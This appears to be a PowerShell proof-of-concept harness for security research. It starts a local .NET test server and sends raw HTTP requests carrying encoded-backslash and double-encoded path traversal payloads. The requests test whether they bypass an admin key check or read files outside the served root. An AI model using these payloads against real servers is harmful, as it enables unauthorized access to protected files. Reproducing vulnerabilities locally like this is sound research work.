param([int]$Port = 5060)
$ErrorActionPreference = 'Stop'
$project = Join-Path $PSScriptRoot 'EscapeEvidence.csproj'
dotnet build $project -c Release

$log = Join-Path $PSScriptRoot 'server.log'
$err = Join-Path $PSScriptRoot 'server.err'
$proc = Start-Process dotnet -ArgumentList @('run','--no-build','-c','Release','--project',$project) -RedirectStandardOutput $log -RedirectStandardError $err -PassThru

function Invoke-Raw([string]$Target, [bool]$Auth) {
    $client = [System.Net.Sockets.TcpClient]::new('127.0.0.1',$Port)
    try {
        $stream = $client.GetStream()
        $extra = if ($Auth) { "X-Admin-Key: research-only`r`n" } else { "" }
        $req = "GET $Target HTTP/1.1`r`nHost: localhost:$Port`r`n" + $extra + "Connection: close`r`n`r`n"
        $bytes = [Text.Encoding]::ASCII.GetBytes($req)
        $stream.Write($bytes,0,$bytes.Length)
        $stream.Flush()
        $reader = [IO.StreamReader]::new($stream,[Text.Encoding]::Latin1)
        return $reader.ReadToEnd()
    } finally { $client.Dispose() }
}

try {
    for ($i=0; $i -lt 80; $i++) {
        try {
            $tcp=[Net.Sockets.TcpClient]::new('127.0.0.1',$Port); $tcp.Dispose(); break
        } catch { Start-Sleep -Milliseconds 250 }
    }

    $cases = [ordered]@{
        normal_protected_no_auth = @('/api/admin/secret.txt',$false)
        normal_protected_auth = @('/api/admin/secret.txt',$true)
        known_nested_bypass = @('/api%5Cadmin%5Csecret.txt',$false)
        parent_escape_1 = @('/api%5C..%5Coutside-secret.txt',$false)
        parent_escape_2 = @('/api%5Cadmin%5C..%5C..%5Coutside-secret.txt',$false)
        parent_escape_mixed = @('/api%5C..%2Foutside-secret.txt',$false)
        encoded_dotdot = @('/api%5C%2E%2E%5Coutside-secret.txt',$false)
        double_encoded_backslash = @('/api%255C..%255Coutside-secret.txt',$false)
    }

    $results=[ordered]@{}
    foreach($name in $cases.Keys) {
        $raw=Invoke-Raw $cases[$name][0] $cases[$name][1]
        $status=($raw -split "`r`n")[0]
        $results[$name]=[ordered]@{
            target=$cases[$name][0]
            status=$status
            contains_protected=$raw.Contains('PROTECTED_IN_ROOT_4E91')
            contains_outside=$raw.Contains('OUTSIDE_PROVIDER_ROOT_B8C2')
            contains_auth=$raw.Contains('AUTH_REQUIRED')
            raw=$raw
        }
    }

    $results | ConvertTo-Json -Depth 6 | Set-Content (Join-Path $PSScriptRoot 'results.json')
    Get-Content (Join-Path $PSScriptRoot 'results.json')
    Write-Host '=== SERVER LOG ==='
    Get-Content $log

    if (-not $results.normal_protected_no_auth.status.Contains('401')) { throw 'positive auth control failed' }
    if (-not $results.normal_protected_auth.contains_protected) { throw 'authenticated protected resource control failed' }
    if (-not $results.known_nested_bypass.contains_protected) { throw 'known nested bypass failed to reproduce' }
}
finally {
    Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
}
